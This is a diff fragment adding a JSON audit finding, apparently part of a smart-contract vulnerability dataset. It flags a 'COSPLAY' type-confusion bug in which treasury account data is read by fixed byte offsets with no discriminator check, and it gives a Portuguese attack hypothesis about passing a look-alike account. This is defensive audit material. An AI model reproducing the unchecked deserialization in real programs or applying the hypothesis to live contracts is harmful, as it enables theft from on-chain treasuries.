+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let data = treasury.try_borrow_data()?;\nlet stored_authority = read_pubkey(&data[8..40]);\nlet balance = u64::from_le_bytes(data[40..48]...);\nlet is_active = data[48] != 0;",
+    "explanation": "Os dados da conta sao desserializados manualmente por offsets fixos (8..40, 40..48, 48) sem validar um discriminador de tipo unico no inicio do buffer. O byte 0..8 e ignorado e nenhum tag/discriminador e conferido, permitindo que uma conta de outro tipo com layout compativel seja interpretada como treasury.",
+    "attack_hypothesis": "Um atacante fornece uma conta de um tipo diferente (com layout de memoria compativel nos offsets usados) como `treasury`, e o programa a trata como uma conta de tesouraria valida, lendo `stored_authority`/`balance`/`is_active` de dados que nao pertencem a esse tipo."
+  }
+}
